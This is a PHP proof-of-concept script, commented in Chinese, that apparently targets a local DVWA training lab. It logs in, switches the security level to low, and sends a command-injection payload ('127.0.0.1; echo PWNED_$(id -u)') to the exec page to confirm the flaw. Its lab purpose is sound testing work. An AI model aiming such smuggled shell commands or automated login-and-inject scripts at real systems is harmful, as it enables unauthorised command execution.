<?php
/* DVWA Command Injection (exec, low) PoC
 *
 * 人工适配版：模型原脚本的请求构造、payload 与判定逻辑保留，只修四处——
 *   A. 原脚本第一次 GET 只设 CURLOPT_COOKIEJAR 不设 CURLOPT_COOKIEFILE，libcurl 的 cookie
 *      引擎因此未启用，GET /login.php 拿到的 PHPSESSID 被直接丢弃；抓到的 token 属于那个
 *      被丢弃的会话，登录 POST 必然被 checkToken 挡回登录页。现在所有请求统一走一个同时设置
 *      COOKIEFILE/COOKIEJAR 的 helper。
 *   B. token 输入框是 value='...'（单引号），原脚本的双引号正则永远抓不到。
 *   C. 本部署 default_security_level=impossible：新会话直接打 /vulnerabilities/exec/
 *      载入的是 impossible.php，必须先登录再把级别切到 low。
 *   D. 动手前自检级别，让 POC 自己证明前提成立。
 */
$BASE = 'http://127.0.0.1';
$TARGET = $BASE . '/vulnerabilities/exec/';
$LOGIN  = $BASE . '/login.php';
$USER = 'admin'; $PASS = 'password';

function req($url, $fields = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/dvwa_cookies.txt');   // 适配 A
    curl_setopt($ch, CURLOPT_COOKIEJAR,  '/tmp/dvwa_cookies.txt');
    if ($fields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
    }
    $body = curl_exec($ch);
    curl_close($ch);
    return $body;
}

function token($html) {   // 适配 B
    return preg_match('/name=.user_token. value=.([^\'"]+)./', $html, $m) ? $m[1] : '';
}

@unlink('/tmp/dvwa_cookies.txt');
$TOKEN = token(req($LOGIN));
req($LOGIN, ['username' => $USER, 'password' => $PASS, 'Login' => 'Login', 'user_token' => $TOKEN]);
$TOKEN = token(req($BASE . '/security.php'));                    // 适配 C
req($BASE . '/security.php', ['security' => 'low', 'seclev_submit' => 'Submit', 'user_token' => $TOKEN]);

$front = req($BASE . '/security.php');                           // 适配 D
preg_match('/<em>Security Level:<\/em>\s*([a-z]+)/', $front, $cm);
echo "=== 前置检查：当前安全级别 = " . ($cm[1] ?? '未解析') . " ===\n";

function extract_pre($h) {
    return preg_match('/<pre>(.*?)<\/pre>/s', $h, $m) ? trim($m[1]) : '';
}

$normal = req($TARGET, ['ip' => '127.0.0.1', 'Submit' => 'Submit']);
$attack = req($TARGET, ['ip' => '127.0.0.1; echo PWNED_$(id -u)', 'Submit' => 'Submit']);
$normalOut = extract_pre($normal);
$attackOut = extract_pre($attack);

echo "=== NORMAL INPUT (127.0.0.1) ===\n";
echo $normalOut . "\n";
echo "=== ATTACK INPUT (127.0.0.1; echo PWNED_\$(id -u)) ===\n";
echo $attackOut . "\n";
echo "=== EXPECTED OBSERVABLE DIFFERENCE ===\n";
echo (strpos($attackOut, 'PWNED_') !== false)
    ? "VULNERABLE: injected command output 'PWNED_...' present in response.\n"
    : "Not observed (token/cookie/level mismatch likely).\n";
